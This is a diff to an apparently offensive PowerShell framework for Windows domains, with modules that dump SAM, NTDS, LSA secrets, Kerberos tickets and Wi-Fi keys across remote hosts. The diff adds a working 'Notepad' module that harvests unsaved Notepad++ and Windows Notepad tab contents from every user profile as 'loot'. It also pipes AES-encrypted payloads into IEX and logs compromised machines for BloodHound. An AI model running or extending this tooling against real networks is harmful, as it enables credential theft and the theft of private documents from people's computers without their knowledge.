@@ -296,6 +296,7 @@ Version : 0.6.3")
     $LSA = Join-Path $PME "LSA"
     $MSSQL = Join-Path $PME "MSSQL"
     $NTDS = Join-Path $PME "NTDS"
+    $NotePad = Join-Path $PME "Notepad"
     $RDP = Join-Path $PME "RDP"
     $SAM = Join-Path $PME "SAM"
     $SCCM = Join-Path $PME "SCCM"
@@ -312,7 +313,7 @@ Version : 0.6.3")
 
     $directories = @(
         $BloodHound, $ConsoleHistory, $ekeys, $FileZilla, $IPMI, $Kerberoast, $LogonPasswords, $LSA, 
-        $MSSQL, $NTDS, $PME, $RDP, $SAM, $SCCM, $Sessions, $SMB, $Spraying, $Tickets, $UserFiles, 
+        $MSSQL, $NTDS, $Notepad, $PME, $RDP, $SAM, $SCCM, $Sessions, $SMB, $Spraying, $Tickets, $UserFiles, 
         $VNCDump, $VNC, $Wifi, $WinSCP
     )
 
@@ -524,6 +525,7 @@ This flush operation clears the stored LDAP queries to prevent the reuse of resu
             "LSA" {}
             "LogonPasswords" {}
             "NTDS" {}
+            "Notepad" {}
             "SAM" {}
             "SCCM" {}
             "Test" {}
@@ -538,7 +540,7 @@ This flush operation clears the stored LDAP queries to prevent the reuse of resu
                 Write-Host "[*] " -ForegroundColor Yellow -NoNewline
                 Write-Host "Invalid Module specified"
                 Write-Host "[*] " -ForegroundColor Yellow -NoNewline
-                Write-Host "Specify either: Amnesiac, ConsoleHistory,eKeys, FileZilla, Files, KerbDump, LSA, LogonPasswords, NTDS, SAM, SCCM, Tickets, VNC, Wifi or WinSCP "
+                Write-Host "Specify either: Amnesiac, ConsoleHistory,eKeys, FileZilla, Files, KerbDump, LSA, LogonPasswords, NTDS, Notepad, SAM, SCCM, Tickets, VNC, Wifi or WinSCP "
                 return
             }
         }
@@ -2192,7 +2194,7 @@ This flush operation clears the stored LDAP queries to prevent the reuse of resu
         $key = Generate-RandomString 32
         $iv = Generate-RandomString 16  
         $n = AESEnc -k $key -iv $iv -t "$LocalKirbDump"
-        $Command = "try {$Arbiter} Catch{}  ; $Decrypt ;  AESDec $key $iv $n | IEX"
+        $Command = "$Decrypt ;  AESDec $key $iv $n | IEX"
 
         
     }
@@ -2201,7 +2203,7 @@ This flush operation clears the stored LDAP queries to prevent the reuse of resu
         $key = Generate-RandomString 32
         $iv = Generate-RandomString 16  
         $n = AESEnc -k $key -iv $iv -t "$LocalSCCM"
-        $Command = "try {$Arbiter} Catch{}  ; $Decrypt ;  AESDec $key $iv $n | IEX "
+        $Command = "$Decrypt ;  AESDec $key $iv $n | IEX "
     }
 
     # SAM
@@ -2249,49 +2251,32 @@ This flush operation clears the stored LDAP queries to prevent the reuse of resu
         $Command = "$Decrypt ;  AESDec $key $iv $n | IEX"
     }
 
-    # Disks
-    elseif ($Module -eq "disks") {
-        $b64 = 'Get-Volume | Where-Object { $_.DriveLetter -ne "" -and $_.FileSystemLabel -ne "system reserved" } | Select-Object DriveLetter, FileSystemLabel, DriveType, @{Name="Size (GB)";Expression={$_.Size / 1GB -replace "\..*"}} | FL'
-        $base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($b64))
-        $Command = "powershell.exe -ep bypass -enc $base64command"
-        # Set module to "" for modules where we do not wish to save output for
-        $Module = ""
+    # Notepad
+    elseif ($Module -eq "Notepad") {
+        $key = Generate-RandomString 32
+        $iv = Generate-RandomString 16  
+        $n = AESEnc -k $key -iv $iv -t "$LocalNotepad"
+        $Command = "$LocalNotepad"
     }
 
-    # LoggedOnUsers
-    elseif ($Module -eq "LoggedOnUsers") {
-        $b64 = "Get-WmiObject -Class Win32_ComputerSystem | Select-Object -ExpandProperty UserName; Write-Host"
-        $base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($b64))
-        $Command = "powershell.exe -ep bypass -enc $base64command"
-        # Set module to "" for modules where we do not wish to save output for
-        $Module = ""
-    }
-
-    # Sessions
-    elseif ($Module -eq "Sessions") {
-        $b64 = "Write-host; query user | Out-String"
-        $base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($b64))
-        $Command = "powershell.exe -ep bypass -enc $base64command"
-        # Set module to "" for modules where we do not wish to save output for
-        $Module = ""
-    }
-
+    
     # ConsoleHistory
     elseif ($Module -eq "ConsoleHistory") {
-        $b64 = "$ConsoleHostHistory"
-        $base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($b64))
-        $Command = "powershell.exe -ep bypass -enc $base64command"
+        $key = Generate-RandomString 32
+        $iv = Generate-RandomString 16  
+        $n = AESEnc -k $key -iv $iv -t "$ConsoleHostHistory"
+        $Command = "$Decrypt ;  AESDec $key $iv $n | IEX"
     }
 
     # Files
     elseif ($Module -eq "Files") {
         $b64 = "$Files"
         $base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($b64))
-        $Command = "powershell.exe -ep bypass -enc $base64command"
+        $Command = "powershell.exe -enc $base64command"
+
     }
 
-    elseif ($Module -eq "" -and $Command -ne "") {
-        
+    elseif ($Module -eq "" -and $Command -ne "") {      
         $key = Generate-RandomString 32
         $iv = Generate-RandomString 16  
         $n = AESEnc -k $key -iv $iv -t "$Command"
@@ -2455,7 +2440,8 @@ This flush operation clears the stored LDAP queries to prevent the reuse of resu
                                 break
                             }
     
-                            $watcher = Get-WmiObject -ComputerName $ComputerName -Class Win32_Process -Filter "ProcessId = $($process.ProcessId)"
+                                if ($LocalAuth) {$watcher = Get-WmiObject -ComputerName $ComputerName -Class Win32_Process -Filter "ProcessId = $($process.ProcessId)" -Credential $cred}
+			                    else {$watcher = Get-WmiObject -ComputerName $ComputerName -Class Win32_Process -Filter "ProcessId = $($process.ProcessId)"}
     
                             Start-Sleep -Seconds 1
                         } While ($watcher -ne $null)
@@ -2541,29 +2527,30 @@ Get-WmiObject -Class $Class -Filter `"InstanceID = '$scriptInstanceID'`" | Set-W
                     elseif ($result -eq "Access Denied") {
                         if ($successOnly) { continue }
                         Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Red" -statusSymbol "[-] " -statusText "ACCESS DENIED" -NameLength $NameLength -OSLength $OSLength
-                        continue
+                        Continue
                     } 
 
                     elseif ($Cleanup -eq "Failure") {
                         Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Red" -statusSymbol "[WARNING] " -statusText "Error when performing cleanup. Cleanup with Remove-WmiObject -Class ""$Class"" -Namespace ""root\cimv2"" -ComputerName $($runspace.ComputerName)" -NameLength $NameLength -OSLength $OSLength
+                        Continue
                     }
 
  
                     elseif ($result -eq "Unspecified Error") {
                         if ($successOnly) { continue }
                         Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Red" -statusSymbol "[-] " -statusText "ERROR" -NameLength $NameLength -OSLength $OSLength
-                        continue
+                        Continue
                     } 
                     elseif ($result -eq "Timed Out") {
                         if ($successOnly) { continue }
                         Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "TIMED OUT" -NameLength $NameLength -OSLength $OSLength
-                        continue
+                        Continue
                     }
             
                     elseif ($result -eq "NotDomainController" -and $Module -eq "NTDS") {
                         if ($successOnly) { continue }
                         Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "NON-DOMAIN CONTROLLER" -NameLength $NameLength -OSLength $OSLength
-                        continue
+                        Continue
                     } 
 
                     elseif ($result -like "*ActualConfig: Invalid namespace*" -and $Module -eq "SCCM") {
@@ -2583,6 +2570,7 @@ Get-WmiObject -Class $Class -Filter `"InstanceID = '$scriptInstanceID'`" | Set-W
                         Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Green" -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
                         Append-BHQuery -ComputerName $($runspace.ComputerName.Split('.')[0]) -Domain $Domain -ComputerOwned
                         Append-BHQuery -ComputerName $($runspace.ComputerName.Split('.')[0]) -Domain $Domain -UserName $Username -AdminToProperty
+                        Continue
                     } 
 
                     elseif ($result -match "[a-zA-Z0-9]") {
@@ -2590,6 +2578,7 @@ Get-WmiObject -Class $Class -Filter `"InstanceID = '$scriptInstanceID'`" | Set-W
                         if ($result -eq "No Results") {
                             if ($successOnly) { continue }
                             Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "NO RESULTS" -NameLength $NameLength -OSLength $OSLength
+                            Continue
                         } 
                         else {
                             
@@ -2597,7 +2586,7 @@ Get-WmiObject -Class $Class -Filter `"InstanceID = '$scriptInstanceID'`" | Set-W
                             Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Green" -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
                             Append-BHQuery -ComputerName $($runspace.ComputerName.Split('.')[0]) -Domain $Domain -ComputerOwned
                             Append-BHQuery -ComputerName $($runspace.ComputerName.Split('.')[0]) -Domain $Domain -UserName $Username -AdminToProperty
-                            Write-Output ""
+                            #Write-Output ""
 
                             $filePath = switch ($Module) {
                                 "ConsoleHistory" { "$ConsoleHistory\$($runspace.ComputerName)-ConsoleHistory.txt" }
@@ -2608,6 +2597,7 @@ Get-WmiObject -Class $Class -Filter `"InstanceID = '$scriptInstanceID'`" | Set-W
                                 "LogonPasswords" { "$LogonPasswords\$($runspace.ComputerName)-LogonPasswords.txt" }
                                 "LSA" { "$LSA\$($runspace.ComputerName)-LSA.txt" }
                                 "NTDS" { "$NTDS\$($runspace.ComputerName)-NTDS.txt" }
+                                "Notepad" { "$Notepad\$($runspace.ComputerName)-Notepad.txt" }
                                 "SAM" { "$SAM\$($runspace.ComputerName)-SAMHashes.txt" }
                                 "SCCM" { "$SCCM\$($runspace.ComputerName)-SCCM.txt" }
                                 "Tickets" { "$MimiTickets\$($runspace.ComputerName)-Tickets.txt" }
@@ -2641,6 +2631,7 @@ Get-WmiObject -Class $Class -Filter `"InstanceID = '$scriptInstanceID'`" | Set-W
                         Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Green" -statusSymbol "[+] " -statusText "SUCCESS " -NameLength $NameLength -OSLength $OSLength
                         Append-BHQuery -ComputerName $($runspace.ComputerName.Split('.')[0]) -Domain $Domain -ComputerOwned
                         Append-BHQuery -ComputerName $($runspace.ComputerName.Split('.')[0]) -Domain $Domain -UserName $Username -AdminToProperty
+                        Continue
                     }
 
                     # Dispose of runspace and close handle
@@ -2942,6 +2933,7 @@ while (`$true) {
                         Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Green" -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
                         Append-BHQuery -ComputerName $($runspace.ComputerName.Split('.')[0]) -Domain $Domain -ComputerOwned
                         Append-BHQuery -ComputerName $($runspace.ComputerName.Split('.')[0]) -Domain $Domain -UserName $Username -AdminToProperty
+                        Continue
                     } 
             
                     elseif ($result -eq "Unable to connect") {}
@@ -2951,6 +2943,7 @@ while (`$true) {
                         if ($result -eq "No Results") {
                             if ($successOnly) { continue }
                             Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "NO RESULTS" -NameLength $NameLength -OSLength $OSLength
+                            Continue
                         }
                  
                         else {
@@ -2958,7 +2951,7 @@ while (`$true) {
                             Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Green" -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
                             Append-BHQuery -ComputerName $($runspace.ComputerName.Split('.')[0]) -Domain $Domain -ComputerOwned
                             Append-BHQuery -ComputerName $($runspace.ComputerName.Split('.')[0]) -Domain $Domain -UserName $Username -AdminToProperty
-                            Write-Output ""
+                            #Write-Output ""
 
                             $filePath = switch ($Module) {
                                 "ConsoleHistory" { "$ConsoleHistory\$($runspace.ComputerName)-ConsoleHistory.txt" }
@@ -2969,6 +2962,7 @@ while (`$true) {
                                 "LogonPasswords" { "$LogonPasswords\$($runspace.ComputerName)-LogonPasswords.txt" }
                                 "LSA" { "$LSA\$($runspace.ComputerName)-LSA.txt" }
                                 "NTDS" { "$NTDS\$($runspace.ComputerName)-NTDS.txt" }
+                                "Notepad" { "$Notepad\$($runspace.ComputerName)-Notepad.txt" }
                                 "SAM" { "$SAM\$($runspace.ComputerName)-SAMHashes.txt" }
                                 "SCCM" { "$SCCM\$($runspace.ComputerName)-SCCM.txt" }
                                 "Tickets" { "$MimiTickets\$($runspace.ComputerName)-Tickets.txt" }
@@ -3002,6 +2996,7 @@ while (`$true) {
                         Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Green" -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
                         Append-BHQuery -ComputerName $($runspace.ComputerName.Split('.')[0]) -Domain $Domain -ComputerOwned
                         Append-BHQuery -ComputerName $($runspace.ComputerName.Split('.')[0]) -Domain $Domain -UserName $Username -AdminToProperty
+                        Continue
                     }
 
                     # Dispose of runspace and close handle
@@ -3192,39 +3187,39 @@ while (`$true) {
                     if ($result -eq "Access Denied") {
                         if ($successOnly) { continue }
                         Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Red" -statusSymbol "[-] " -statusText "ACCESS DENIED" -NameLength $NameLength -OSLength $OSLength
-                        continue
+                        Continue
                     }
                      
                     elseif ($result -eq "Unspecified Error") {
                         if ($successOnly) { continue }
                         Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Red" -statusSymbol "[-] " -statusText "ERROR" -NameLength $NameLength -OSLength $OSLength
-                        continue
+                        Continue
                     }
                     
                     elseif ($result -eq "Unable to resolve") {
                         if ($successOnly) { continue }
                         Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "Unable to resolve DNS name, required for WinRM" -NameLength $NameLength -OSLength $OSLength
-                        continue
+                        Continue
 
                     } 
 
                     elseif ($result -like "*Cannot find the computer*") {
                         if ($successOnly) { continue }
                         Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "Unable to fully resolve the FQDN" -NameLength $NameLength -OSLength $OSLength
-                        continue
+                        Continue
 
                     } 
 
                     elseif ($result -eq "Timed Out") {
                         if ($successOnly) { continue }
                         Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "TIMED OUT" -NameLength $NameLength -OSLength $OSLength
-                        continue
+                        Continue
                     }
             
                     elseif ($result -eq "NotDomainController" -and $Module -eq "NTDS") {
                         if ($successOnly) { continue }
                         Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "NON-DOMAIN CONTROLLER" -NameLength $NameLength -OSLength $OSLength
-                        continue
+                        Continue
                     }
 
                     elseif ($result -like "*Object reference not set to an instance of an object.*" -and $Module -eq "SCCM") {
@@ -3244,6 +3239,7 @@ while (`$true) {
                         Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Green" -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
                         Append-BHQuery -ComputerName $($runspace.ComputerName.Split('.')[0]) -Domain $Domain -ComputerOwned
                         Append-BHQuery -ComputerName $($runspace.ComputerName.Split('.')[0]) -Domain $Domain -UserName $Username -AdminToProperty
+                        Continue
                     } 
             
                     elseif ($result -eq "Unable to connect") {}
@@ -3253,13 +3249,14 @@ while (`$true) {
                         if ($result -eq "No Results") {
                             if ($successOnly) { continue }
                             Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "NO RESULTS" -NameLength $NameLength -OSLength $OSLength
+                            Continue
                         } 
                         else {
                             $Global:SuccessCount ++
                             Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Green" -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
                             Append-BHQuery -ComputerName $($runspace.ComputerName.Split('.')[0]) -Domain $Domain -ComputerOwned
                             Append-BHQuery -ComputerName $($runspace.ComputerName.Split('.')[0]) -Domain $Domain -UserName $Username -AdminToProperty
-                            Write-Output ""
+                            #Write-Output ""
 
                             $filePath = switch ($Module) {
                                 "ConsoleHistory" { "$ConsoleHistory\$($runspace.ComputerName)-ConsoleHistory.txt" }
@@ -3270,6 +3267,7 @@ while (`$true) {
                                 "LogonPasswords" { "$LogonPasswords\$($runspace.ComputerName)-LogonPasswords.txt" }
                                 "LSA" { "$LSA\$($runspace.ComputerName)-LSA.txt" }
                                 "NTDS" { "$NTDS\$($runspace.ComputerName)-NTDS.txt" }
+                                "Notepad" { "$Notepad\$($runspace.ComputerName)-Notepad.txt" }
                                 "SAM" { "$SAM\$($runspace.ComputerName)-SAMHashes.txt" }
                                 "SCCM" { "$SCCM\$($runspace.ComputerName)-SCCM.txt" }
                                 "Tickets" { "$MimiTickets\$($runspace.ComputerName)-Tickets.txt" }
@@ -3303,6 +3301,7 @@ while (`$true) {
                         Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Green" -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
                         Append-BHQuery -ComputerName $($runspace.ComputerName.Split('.')[0]) -Domain $Domain -ComputerOwned
                         Append-BHQuery -ComputerName $($runspace.ComputerName.Split('.')[0]) -Domain $Domain -UserName $Username -AdminToProperty
+                        Continue
                     }
 
                     # Dispose of runspace and close handle
@@ -4220,7 +4219,7 @@ Get-WmiObject -Class $Class -Filter `"InstanceID = '$scriptInstanceID'`" | Set-W
                     elseif ($result -eq "Access Denied") {
                         if ($successOnly) { continue }
                         Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Red" -statusSymbol "[-] " -statusText "ACCESS DENIED" -NameLength $NameLength -OSLength $OSLength
-                        continue
+                        Continue
                     } 
                     elseif ($result -eq "Unspecified Error") {
                         if ($successOnly) { continue }
@@ -4230,13 +4229,13 @@ Get-WmiObject -Class $Class -Filter `"InstanceID = '$scriptInstanceID'`" | Set-W
                     elseif ($result -eq "Timed Out") {
                         if ($successOnly) { continue }
                         Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "TIMED OUT" -NameLength $NameLength -OSLength $OSLength
-                        continue
+                        Continue
                     }
             
                     elseif ($result -eq "NotDomainController" -and $Module -eq "NTDS") {
                         if ($successOnly) { continue }
                         Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "NON-DOMAIN CONTROLLER" -NameLength $NameLength -OSLength $OSLength
-                        continue
+                        Continue
                     } 
 
                     elseif ($result -like "*Object reference not set to an instance of an object.*" -and $Module -eq "SCCM") {
@@ -4256,6 +4255,7 @@ Get-WmiObject -Class $Class -Filter `"InstanceID = '$scriptInstanceID'`" | Set-W
                         Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Green" -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
                         Append-BHQuery -ComputerName $($runspace.ComputerName.Split('.')[0]) -Domain $Domain -ComputerOwned
                         Append-BHQuery -ComputerName $($runspace.ComputerName.Split('.')[0]) -Domain $Domain -UserName $Username -AdminToProperty
+                        Continue
                     } 
 
                     elseif ($result -match "[a-zA-Z0-9]") {
@@ -4263,13 +4263,14 @@ Get-WmiObject -Class $Class -Filter `"InstanceID = '$scriptInstanceID'`" | Set-W
                         if ($result -eq "No Results") {
                             if ($successOnly) { continue }
                             Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "NO RESULTS" -NameLength $NameLength -OSLength $OSLength
+                            Continue
                         } 
                         else {
                             $Global:SuccessCount ++
                             Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Green" -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
                             Append-BHQuery -ComputerName $($runspace.ComputerName.Split('.')[0]) -Domain $Domain -ComputerOwned
                             Append-BHQuery -ComputerName $($runspace.ComputerName.Split('.')[0]) -Domain $Domain -UserName $Username -AdminToProperty
-                            Write-Output ""
+                            #Write-Output ""
 
                             $filePath = switch ($Module) {
                                 "ConsoleHistory" { "$ConsoleHistory\$($runspace.ComputerName)-ConsoleHistory.txt" }
@@ -4280,6 +4281,7 @@ Get-WmiObject -Class $Class -Filter `"InstanceID = '$scriptInstanceID'`" | Set-W
                                 "LogonPasswords" { "$LogonPasswords\$($runspace.ComputerName)-LogonPasswords.txt" }
                                 "LSA" { "$LSA\$($runspace.ComputerName)-LSA.txt" }
                                 "NTDS" { "$NTDS\$($runspace.ComputerName)-NTDS.txt" }
+                                "Notepad" { "$Notepad\$($runspace.ComputerName)-Notepad.txt" }
                                 "SAM" { "$SAM\$($runspace.ComputerName)-SAMHashes.txt" }
                                 "SCCM" { "$SCCM\$($runspace.ComputerName)-SCCM.txt" }
                                 "Tickets" { "$MimiTickets\$($runspace.ComputerName)-Tickets.txt" }
@@ -4313,6 +4315,7 @@ Get-WmiObject -Class $Class -Filter `"InstanceID = '$scriptInstanceID'`" | Set-W
                         Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Green -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
                         Append-BHQuery -ComputerName $($runspace.ComputerName.Split('.')[0]) -Domain $Domain -ComputerOwned
                         Append-BHQuery -ComputerName $($runspace.ComputerName.Split('.')[0]) -Domain $Domain -UserName $Username -AdminToProperty
+                        Continue
                     }
 
                     # Dispose of runspace and close handle
@@ -7700,6 +7703,110 @@ function Wifi-Dump {
 }
 
 Wifi-Dump
+'@
+
+$Global:LocalNotepad = @'
+
+function DumpNotepad {
+
+    function Extract-Strings {
+        param (
+            [Parameter(Mandatory = $true)]
+            [ValidateScript({ Test-Path $_ -PathType 'Leaf' })]
+            [string]$FilePath,
+
+            [ValidateSet('Default', 'Ascii', 'Unicode')]
+            [string]$Encoding = 'Default',
+
+            [uint32]$MinimumLength = 3
+        )
+
+        $Results = @()
+
+        if ($Encoding -eq 'Unicode' -or $Encoding -eq 'Default') {
+            $UnicodeFileContents = [System.IO.File]::ReadAllText($FilePath, [System.Text.Encoding]::Unicode)
+            $UnicodeRegex = "[\u0020-\u007E]{$MinimumLength,}"
+            $Results += [regex]::Matches($UnicodeFileContents, $UnicodeRegex) | ForEach-Object { $_.Value }
+        }
+
+        if ($Encoding -eq 'Ascii' -or $Encoding -eq 'Default') {
+            $AsciiFileContents = [System.IO.File]::ReadAllBytes($FilePath)
+            $AsciiString = -join ($AsciiFileContents | ForEach-Object { [char]$_ })
+            $AsciiRegex = "[\x20-\x7E]{$MinimumLength,}"
+            $Results += [regex]::Matches($AsciiString, $AsciiRegex) | ForEach-Object { $_.Value }
+        }
+
+        $Results
+    }
+
+    function Get-UserProfilePaths {
+        (Get-ChildItem -Path "$env:SystemDrive\Users" | 
+            Where-Object { $_.BaseName -ne "Public" -and $_.BaseName -notlike "*defaultuser*" }
+        ).BaseName
+    }
+
+    function Get-NotePadPlusPlus {
+        param (
+            [string]$UserProfile
+        )
+
+        $RootPath = "$env:SystemDrive\Users\$UserProfile\APPDATA\Roaming\NotePad++\backup\"
+        $BackupFiles = Get-ChildItem -Path $RootPath -ErrorAction "SilentlyContinue"
+
+        foreach ($BackupFile in $BackupFiles) {
+            $FullPath = $BackupFile.FullName
+            $Content = Get-Content -Raw -Path $FullPath
+            #Write-Output "========================================================================================="
+            Write-Output "File Name: $($BackupFile.Name)"
+            Write-Output ""
+            Write-Output $Content
+            Write-Output "========================================================================================="
+        }
+    }
+
+    function Get-Notepad {
+        param (
+            [string]$UserProfile
+        )
+
+        $PackagesPath = "$env:SystemDrive\Users\$UserProfile\AppData\Local\Packages"
+        $NotepadPath = Get-ChildItem -Path $PackagesPath -Filter "Microsoft.WindowsNotepad_*" -Directory -ErrorAction "SilentlyContinue" | Select-Object -First 1
+
+        if ($NotepadPath) {
+            $RootPath = "$($NotepadPath.FullName)\LocalState\TabState\"
+            $BackupFiles = Get-ChildItem -Path $RootPath -ErrorAction "SilentlyContinue"
+
+            foreach ($BackupFile in $BackupFiles) {
+                $FullPath = $BackupFile.FullName
+                $Content = Extract-Strings -FilePath $FullPath
+                #Write-Output "========================================================================================="
+                Write-Output "File Name: $($BackupFile.Name)"
+                Write-Output ""
+                Write-Output $Content
+                Write-Output "========================================================================================="
+            }
+        } 
+    }
+
+    $UserProfiles = Get-UserProfilePaths
+
+    foreach ($UserProfile in $UserProfiles) {
+        Get-NotePadPlusPlus -UserProfile $UserProfile
+    }
+
+
+    foreach ($UserProfile in $UserProfiles) {
+        Get-Notepad -UserProfile $UserProfile
+    }
+}
+
+$Loot = DumpNotepad
+if (!$Loot){Write-Output "No Results"} else {
+                Write-Output "========================================================================================="
+$Loot | Write-Output
+                Write-Output "========================================================================================="
+}
+
 '@
 
 
